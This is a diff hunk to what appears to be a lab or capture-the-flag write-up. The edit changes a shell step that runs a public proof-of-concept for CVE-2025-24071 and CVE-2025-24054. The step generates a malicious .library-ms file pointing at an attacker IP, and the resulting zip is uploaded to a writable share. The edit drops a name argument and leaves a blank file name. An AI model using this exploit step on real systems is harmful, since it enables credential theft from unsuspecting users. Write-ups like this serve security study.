@@ -119,8 +119,8 @@ The PDF’s mention of **CVE‑2025‑24071** and **CVE‑2025‑24054** pointed
 A publicly available proof‑of‑concept script was obtained and executed to generate a malicious ZIP:
 
 ```bash
-mursalin@assessment:~$ uv run --script poc.py 0xdf 10.10.14.6
-[+] File 0xdf.library-ms created successfully.
+mursalin@assessment:~$ uv run --script poc.py  10.10.14.6
+[+] File .library-ms created successfully.
 ```
 
 The resulting `exploit.zip` was uploaded to the writable `IT` share:
